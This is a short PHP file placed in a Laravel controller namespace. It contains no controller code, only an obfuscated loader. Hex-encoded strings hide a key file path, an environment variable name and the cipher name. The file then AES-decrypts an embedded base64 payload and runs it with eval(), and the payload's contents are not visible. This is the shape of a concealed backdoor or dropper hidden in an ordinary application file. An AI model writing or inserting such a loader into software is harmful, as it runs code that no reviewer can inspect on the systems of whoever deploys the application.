<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jIwX6yXJmQGMyZZ3F4QhMQ==');

$c=base64_decode(

'hGduQDZctGvB7JO+aWroCN/NEO2dATzBqH2S/+WA0Bab4Zs2fvoA++eCdyboVXupUJhwPDCQAEfr' .
'+wi5Yx9yQbouGHtFhyUSxJRx22pPwweXNmrCvaR+DcGWLwnt9E57VikJZ6AP+7Kk6nYzvMNr25qW' .
'UsDTcMxmeHy16bO07xeww9XK48pRnf3DC8qAj139wXLfKUq9OjlRCGKNNRtw/m3vtt5JcraLmYaT' .
'OBM6RqZW5Nc1BQ+VgmKO2b+ob71R'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

